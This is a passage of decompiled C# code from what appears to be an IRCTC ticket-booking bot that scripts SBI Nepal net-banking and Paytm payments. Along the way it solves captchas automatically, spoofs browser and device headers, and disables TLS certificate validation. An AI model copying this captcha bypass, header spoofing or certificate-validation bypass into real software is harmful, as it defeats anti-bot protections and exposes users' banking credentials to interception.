.DESCRIPTIVE_HEADER_DATE%40%40Account%7C%7CLC2197%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Pay+From+Account%7C%7CLC13738%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Initiator+Peer+To+Peer+ID%3DTranRequestManagerFG.INITIATOR_PTP_DETAILS%40%40Debit%2FCredit%3DTranRequestManagerFG.CREDIT_DEBIT_FLAG%40%40Amount%3DTranRequestManagerFG.ENTRY_AMT%40%40Network%3DTranRequestManagerFG.NWK_TYP%40%40Beneficiary+Reference%3DTranRequestManagerFG.BENEFICIARY_REFERENCE%40%40Remarks%3DTranRequestManagerFG.ENT_REMARKS%40%40Mandate+ID%3DTranRequestManagerFG.MANDATE_ID%40%40Negotiated+Rate%3DnegotiatedRateComp%40%40Dealer+Reference%3DTranRequestManagerFG.DEALER_REF%40%40Trace+Account%3DTranRequestManagerFG.TRACE_ACCOUNT_ENTITY_ID%40%40On+Behalf+of%7C%7CLC3459%3DonBehalfOfComp%40%40Collect+On+Behalf+of%7C%7CLC13742%3DonBehalfOfComp%40%40Address%3DTranRequestManagerFG.CUST_ADDRESS%40%40State%3DTranRequestManagerFG.CUST_STATE%40%40Country%3DTranRequestManagerFG.CUST_COUNTRY%40%40Remark%3DTranRequestManagerFG.ORIG_REMARKS%40%40Delivery+Mode%3DTranRequestManagerFG.DELIVERY_MODE%40%40Counterparty+Bank+Clearing+Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Counterparty+Bank+Clearing+Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Network+Product%3DTranRequestManagerFG.NWR_PRODUCT%40%40Transfer+Information%3DTranRequestManagerFG.TRANSFER_INFO%40%40Commission%2FCharge+Indicator%3DTranRequestManagerFG.COMMISSION_IND%40%40Intermediary+Bank+Search%3DbankSearchComp%40%40&target=PageConfigurationMaster_3W__1:AvailableBalance=TranRequestManagerFG.RESULTANT_AVAILABLE_BALANCE,PageConfigurationMaster_3W__1:AvailableBalance1=TranRequestManagerFG.INITIATOR_ACCOUNT_BAL&errorForConntrolIds=Transaction+Reference+Name%3DTranRequestManagerFG.TXN_REF_NAME%40%40Frequency+Type%3DTranRequestManagerFG.FREQ_TYPE%40%40Frequency%3DTranRequestManagerFG.REC_FREQ%40%40Recurring+Date%3DTranRequestManagerFG.TXN_DATE%40%40Transaction+Date%7C%7CLC1146%3DTranRequestManagerFG.TXN_DATE%40%40Effective+Date%7C%7CLC12832%3DTranRequestManagerFG.TXN_DATE%40%40Next+Installment+Date%3DTranRequestManagerFG.TXN_DATE%40%40Number+Of+Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Total+Number+Of+Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Pending+Installments%3DTranRequestManagerFG.PEN_NO_INST%40%40End+Date%3DTranRequestManagerFG.END_DATE%40%40Validity+Indicator%3DTranRequestManagerFG.VAL_IND%40%40Marked+for+Stop%3DTranRequestManagerFG.MARKED_FOR_STOP_STATUS%40%40First+Payment+Date%3DTranRequestManagerFG.FIRST_PMT_DATE%40%40First+Payment+Amount%3DTranRequestManagerFG.FIRST_PMT_AMT%40%40Last+Payment+Amount%3DTranRequestManagerFG.LAST_PMT_AMT%40%40Originator+ID%3DTranRequestManagerFG.ORIGINATOR_ID_COMPANY_ID%40%40Initiator+Account%3DTranRequestManagerFG.INITOR_ACCOUNT_BATCH%40%40Originator+Remarks%3DTranRequestManagerFG.ORIGINATOR_REMARKS%40%40Descriptive+Date%3DTranRequestManagerFG.DESCRIPTIVE_HEADER_DATE%40%40Account%7C%7CLC2197%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Pay+From+Account%7C%7CLC13738%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Initiator+Peer+To+Peer+ID%3DTranRequestManagerFG.INITIATOR_PTP_DETAILS%40%40Debit%2FCredit%3DTranRequestManagerFG.CREDIT_DEBIT_FLAG%40%40Amount%3DTranRequestManagerFG.ENTRY_AMT%40%40Network%3DTranRequestManagerFG.NWK_TYP%40%40Beneficiary+Reference%3DTranRequestManagerFG.BENEFICIARY_REFERENCE%40%40Remarks%3DTranRequestManagerFG.ENT_REMARKS%40%40Mandate+ID%3DTranRequestManagerFG.MANDATE_ID%40%40Negotiated+Rate%3DnegotiatedRateComp%40%40Dealer+Reference%3DTranRequestManagerFG.DEALER_REF%40%40Trace+Account%3DTranRequestManagerFG.TRACE_ACCOUNT_ENTITY_ID%40%40On+Behalf+of%7C%7CLC3459%3DonBehalfOfComp%40%40Collect+On+Behalf+of%7C%7CLC13742%3DonBehalfOfComp%40%40Address%3DTranRequestManagerFG.CUST_ADDRESS%40%40State%3DTranRequestManagerFG.CUST_STATE%40%40Country%3DTranRequestManagerFG.CUST_COUNTRY%40%40Remark%3DTranRequestManagerFG.ORIG_REMARKS%40%40Delivery+Mode%3DTranRequestManagerFG.DELIVERY_MODE%40%40Counterparty+Bank+Clearing+Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Counterparty+Bank+Clearing+Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Network+Product%3DTranRequestManagerFG.NWR_PRODUCT%40%40Transfer+Information%3DTranRequestManagerFG.TRANSFER_INFO%40%40Commission%2FCharge+Indicator%3DTranRequestManagerFG.COMMISSION_IND%40%40Intermediary+Bank+Search%3DbankSearchComp%40%40&requestId=2" });
                        string string_95 = null;
                        Int32_0 = 2;
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(text12, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        string_91 = string_92;
                        text12 = string_94.Substring(string_94.IndexOf("formAction") + 12);
                        string_92 = text6 + text12.Substring(0, text12.IndexOf("\""));
                        string str = DateTime.Now.ToString("dd/MM/yyyy").Replace("-", "/");
                        text4 = "TranRequestManagerFG.REC_FREQ=1&TranRequestManagerFG.FREQ_IN_DAYS=&TranRequestManagerFG.TXN_DATE=" + HttpUtility.UrlEncode(str) + "&TranRequestManagerFG.TOT_NO_INST=&TranRequestManagerFG.INITOR_ACCOUNT=" + text13 + "&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.TXN_CRN=INR&TranRequestManagerFG.ENT_REMARKS=BOOKING&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.END_DATE_UPDATE=-1&FG_BUTTONS__=ADDNL_INFO%2CADD_ENTRY_WITH_ADDNL_DETAIL%2CSAVE_AS_TEMPLATE%2CSAVE_TRANSACTION_ADDN_DETAILS%2CCONTINUE_TXN_WITH_ADDN_DET%2CFREQ_TYPE_GO%2CVIEW_OWN_ACNT_DET%2CLOOK_UP%2CADD_COUNTER_PARTY%2CCHECK_COUNTER_RATE%2CBACK_TO_ACTION%2CBACK_FOR_CP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=&TranRequestManagerFG.TXN_TYPE=SHP&FreqTypeFilterValue=O&FrequencyTypeFGValue=O&TranRequestManagerFG.CP_ADDRESS=Address1&GROUPLET_FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiatePaymentUX3&RIA_TARGETS=TranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2CTranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_FXD_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2C%2CTranRequestManagerFG.CUST_ADDRESS%2CTranRequestManagerFG.CUST_CITY%2CTranRequestManagerFG.CUST_STATE%2CTranRequestManagerFG.CUST_ZIP%2CTranRequestManagerFG.CUST_COUNTRY%2C%2C%2CTranRequestManagerFG.BANK_IDENTIFIER%2CTranRequestManagerFG.BANK_IDENTIFIER_NETWORK%2C%2C%2C%2CTranRequestManagerFG.ON_BEHALF_OF_ID%2CTranRequestManagerFG.CUST_ADDRESS%2CTranRequestManagerFG.CUST_CITY%2CTranRequestManagerFG.CUST_STATE%2CTranRequestManagerFG.CUST_ZIP%2CTranRequestManagerFG.CUST_COUNTRY%2C%2C%2CTranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2C%2CTranRequestManagerFG.NWK_TYP%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_M%2CTranRequestManagerFG.PAYEE_FORMAT%2CTranRequestManagerFG.IS_CONSUMER_CODE_VISIBLE%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_L%2CTranRequestManagerFG.ENTRY_AMT%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_C%2CTranRequestManagerFG.ENTRY_AMT%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_B%2CTranRequestManagerFG.ENTRY_AMT%2CTranRequestManagerFG.BENEFICIARY_REFERENCE%2C%2C%2CTranRequestManagerFG.DESTINATION_TYPE%2C%2C%2CTranRequestManagerFG.BILLER_NAME%2C%2C%2CTranRequestManagerFG.INITOR_ACCOUNT_BATCH%2C%2C%2CTranRequestManagerFG.BENEFICIARY_REFERENCE%2CTranRequestManagerFG.DELIVERY_MODE%2C%2C%2CAvailableBalance%2CAvailableBalance1%2C%2C%2CAvailableBalanceBatch%2CAvailableBalanceBatch1%2C%2C%2CAvailableBalance%2CAvailableBalance1%2C%2C%2CTranRequestManagerFG.TXN_CRN_RMT%2C%2C&JS_ENABLED_FLAG=Y&DECRYPT_FLAG=N&CHECKBOX_NAMES__=&Requestid=2&Action.CONTINUE_TXN_WITH_ADDN_DET=Continue&__GROUPLET_NAME__=PageConfigurationMaster_3W__1&__RIA__=GROUPLET&GROUPLETS_IN_PAGE=,PageConfigurationMaster_3W__1,PageConfigurationMaster_W49__1";
                        Int32_0 = 2;
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        string_91 = string_92;
                        String_0 = string_94.Substring(string_94.IndexOf("Requestid") + 18);
                        String_0 = String_0.Substring(0, String_0.IndexOf("\""));
                        text12 = string_94.Substring(string_94.IndexOf("formAction") + 12);
                        string_92 = text6 + text12.Substring(0, text12.IndexOf("\""));
                        text9 = string_94.Substring(string_94.IndexOf("'__JS_ENCRYPT_KEY__' value='") + 28);
                        text9 = HttpUtility.UrlDecode(text9.Substring(0, text9.IndexOf("'")));
                        string text14 = "";
                        text11 = "UNION2";
                        updateTStatus_2?.Invoke(1005, text11 + "||dummy1||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj3 = new object();
                            object obj4 = obj3;
                            lock (obj4)
                            {
                                text14 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text14);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        string text15 = "";
                        text11 = "UNION2";
                        updateTStatus_2?.Invoke(1005, text11 + "||dummy2||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj5 = new object();
                            object obj6 = obj5;
                            lock (obj6)
                            {
                                text15 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text15);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        text10 = "";
                        text11 = "UNION3";
                        updateTStatus_2?.Invoke(1005, text11 + "||" + text3 + "||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj7 = new object();
                            object obj8 = obj7;
                            lock (obj8)
                            {
                                text10 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text10);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        text4 = "TranRequestManagerFG._USER_REMARKS_=BOOKING&ApproverListFG.LOOK_UP_INPARAMS__=CALL_BACK%3DApproverListFG.LOOKUP_RETURN__%2CApproverListFG.SELECTED_RULE_INDEX%3D_RULE_INDEX_%2CApproverListFG.SELECTED_NEXT_APPROVER%3D_NEXT_APPROVER_%2CApproverListFG.ENTERED_USER_REMARKS%3D_USER_REMARKS_&ApproverListFG.LOOK_UP_OUTPARAMS__=TranRequestManagerFG._NEXT_APPROVER_%3DSELECTED_NEXT_APPROVER%2CTranRequestManagerFG._USER_REMARKS_%3DENTERED_USER_REMARKS&buffer=&dummy1=" + text14 + "&TranRequestManagerFG.TRANSACTION_PASSWORD__=" + text10 + "&dummy2=" + text15 + "&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE_ADDN_DETAILS%2CSEL_USER_LOOKUP&GROUPLET_FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiateSingleEntryPaymentConfirmationUX3&RIA_TARGETS=%2C&JS_ENABLED_FLAG=Y&DECRYPT_FLAG=Y&CHECKBOX_NAMES__=&Requestid=3&__JS_ENCRYPT_KEY__=&Action.SUBMIT_TRANSACTION=Confirm payment&__GROUPLET_NAME__=PageConfigurationMaster_3W__1&__RIA__=GROUPLET&GROUPLETS_IN_PAGE=,PageConfigurationMaster_3W__1,PageConfigurationMaster_W49__1";
                        Int32_0 = 2;
                        clsMain.Lock("Third Hit Inp = " + text4);
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        if (!string_94.Contains("Payment Successful"))
                        {
                            if (!string_94.Contains("You were left with") && !string_94.Contains("Invalid Transaction Password"))
                            {
                                if (string_94.Contains("Daily Number of Transactions Limit exceeded"))
                                {
                                    string_90 = "Daily Number of Transactions Limit exceeded.";
                                }
                                else
                                {
                                    string_90 = "Failed while processing payment.";
                                }
                            }
                            else
                            {
                                string_90 = "Your Txn Password may be wrong.";
                            }
                            clsMain.Lock("Third Hit Failed. Check HTML strerr=" + string_90);
                            return false;
                        }
                        startIndex = string_94.IndexOf("https://www.irctc.co.in");
                        if (startIndex > 0)
                        {
                            clsMain.Lock("Success ProcessSBINepalNB ");
                            text12 = string_94.Substring(string_94.IndexOf("https://www.irctc.co.in"));
                            text12 = text12.Substring(0, text12.IndexOf("\""));
                            string_89 = text12.Replace("&#63;", "?").Replace("&#61;", "=").Replace("&#37;", "%");
                            string_90 = string_92;
                            return true;
                        }
                    }
                }
                catch (Exception ex)
                {
                    clsMain.Lock("ProcessSBINepalNB: " + ex.Message);
                    clsMain.method_74("ProcessSBINepalNB", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with SBI Nepal NB Payment";
            string string_96 = "Html doesn't contains onlinesbiglobal, returning.";
            clsMain.Lock(string_96);
            return false;
        }

        private string method_182(string string_86)
        {
            string result = null;
            try
            {
                string text = string_86.Substring(string_86.IndexOf("img src=\"AuthenticationController") + 9);
                string string_87 = "https://www.onlinesbiglobal.com/NPINB/" + text.Substring(0, text.IndexOf("\""));
                string string_88 = "https://www.onlinesbiglobal.com/NPINB/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=NSBL&LANGUAGE_ID=001&AuthenticationFG.MENU_ID=CIMSHP&AuthenticationFG.CALL_MODE=2&RU=https://www.irctc.co.in/eticketing/BankResponse&CATEGORY_ID=VIV&QS=2ZEDGK3LPUup79SBEGpmrQv%2BiVO9DRCzrSRRbuE8VjTZkQMYrcs9S6nv1IEQamatuENm5kPuw2kV%0D%0AEPQn%2B64vIshXHRFof9cL%2BAV5XLpdcctz3AQnUwHEgNog%2B3qSUUUTjH1Ee4mlcMziwxWEwaqryxVVNTqi%0D%0AgeC%2B5%2B%2Bu6WIh%2Bf5%2F2zztqzdMT2F3MhLYjSKBetPdn%2BUh0rSQAcT9M34ECA%3D%3D";
                CookieContainer cookieContainer_ = new CookieContainer();
                bool bool_ = false;
                string string_89 = "";
                int int_ = 0;
                DateTime dateTime_ = DateTime.Now.AddMilliseconds(400.0);
                Bitmap bitmap = method_101(string_87, string_88, webProxy_2, ref cookieContainer_, true, 40000, ref bool_, ref webException_0, ref string_89, ref dateTime_, ref int_);
                if (bitmap != null)
                {
                    frmCAP frmCAP = new frmCAP(clsMain);
                    bitmap = new frmCaptcha(clsMain).method_17(bitmap);
                    result = frmCAP.method_8(bitmap);
                    return result;
                }
                return result;
            }
            catch
            {
                return result;
            }
        }

        internal bool _Request_Razorpay(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "application/json";
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
